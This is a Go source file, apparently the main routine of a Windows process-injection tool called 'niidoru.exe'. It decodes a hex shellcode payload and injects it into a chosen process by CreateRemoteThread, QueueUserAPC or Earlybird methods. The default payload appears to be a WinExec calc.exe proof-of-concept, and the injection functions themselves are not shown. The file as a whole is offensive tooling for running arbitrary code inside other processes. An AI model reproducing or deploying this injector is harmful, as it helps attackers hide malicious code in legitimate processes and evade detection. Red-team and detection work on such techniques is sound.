package main

import "fmt"
import "flag"
import "strings"
import "encoding/hex"


func main() {
   var process_name string;
   var hex_payload string;
   flag.StringVar(&process_name, "n", "", "Process name")
   flag.StringVar(&hex_payload, "h", "505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3", "Hexadecimal payload")
   pid :=  flag.Int("p", 0, "Process ID (PID)")
   method :=  flag.Int("m", 0, "Method for injection")
   flag.Parse()

   hex_payload = strings.Replace(hex_payload, "\\x", "", -1);
   payload, payloadErr := hex.DecodeString(hex_payload)
   if payloadErr != nil {
      fmt.Println("[-] Error decoding hexadecimal payload: %s", payloadErr.Error());
   }

   switch *method{
      case 1:
         CreateRemoteThread_Injection(process_name, *pid, payload)
      case 2:
         QueueUserAPC_Injection(process_name, *pid, payload);
      case 3:
         Earlybird_Injection(process_name, payload);
      default:
         fmt.Println("[+] niidoru.exe -m <METHOD> [ -p <PID> | -n <PROCESS_NAME> ] [ -h HEXADECIMAL_PAYLOAD ]");
   }
}